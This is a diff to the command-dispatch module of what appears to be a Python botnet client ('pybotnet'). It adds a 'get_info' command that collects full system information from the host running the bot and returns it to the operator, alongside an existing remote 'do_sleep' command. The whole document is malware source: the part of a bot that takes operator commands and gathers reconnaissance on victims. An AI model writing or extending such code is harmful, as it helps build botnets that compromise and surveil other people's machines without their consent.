@@ -2,8 +2,12 @@
 
 from time import sleep
 
+
+import util
+
 scripts_name = {
-    "do_sleep": 'do_sleep <scconds> <message>'
+    "do_sleep": 'do_sleep <scconds> <message>',
+    "get_info": 'get_info'
 }
 
 
@@ -18,15 +22,18 @@ def is_command(command):
     return False
 
 
-def execute_scripts(command, logger):
+def execute_scripts(command, pybotnet_up_time, logger):
     command_name = get_command_name(command)
 
     if is_command(command):
         if command_name == 'do_sleep':
             return execute_do_sleep(command, logger)
 
+        elif command_name == 'get_info':
+            return get_info(pybotnet_up_time, logger)
+
     logger.error('invalid command; Wrong format')
-    return False
+    return 'invalid command; Wrong format'
 
 
 def execute_do_sleep(command, logger):
@@ -37,7 +44,7 @@ def execute_do_sleep(command, logger):
         return 'do_sleep done'
     except:
         logger.error('execute_do_sleep invalid command; Wrong format')
-        return False
+        return 'execute_do_sleep invalid command; Wrong format'
 
 
 def do_sleep(seconds, logger, sleep_message=''):
@@ -50,3 +57,8 @@ def do_sleep(seconds, logger, sleep_message=''):
     logger.info(f'sleep {seconds} second | {sleep_message}')
     sleep(float(seconds))
     logger.info('sleep done')
+
+
+def get_info(pybotnet_up_time, logger):
+    logger.info('return system info')
+    return util.get_full_system_info(pybotnet_up_time)
